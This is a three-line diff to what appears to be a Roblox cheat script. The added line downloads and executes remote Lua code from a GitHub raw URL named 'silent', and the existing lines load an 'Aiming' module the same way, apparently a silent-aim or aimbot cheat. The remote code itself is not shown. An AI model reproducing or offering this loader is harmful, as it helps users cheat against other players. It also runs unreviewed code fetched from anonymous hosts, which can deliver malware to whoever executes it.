@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/silent"))()
 local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/asdasdasd2sd23sda/STREEEEEEEEET1/main/cash2"))()
 Aiming.TeamCheck(false)
 
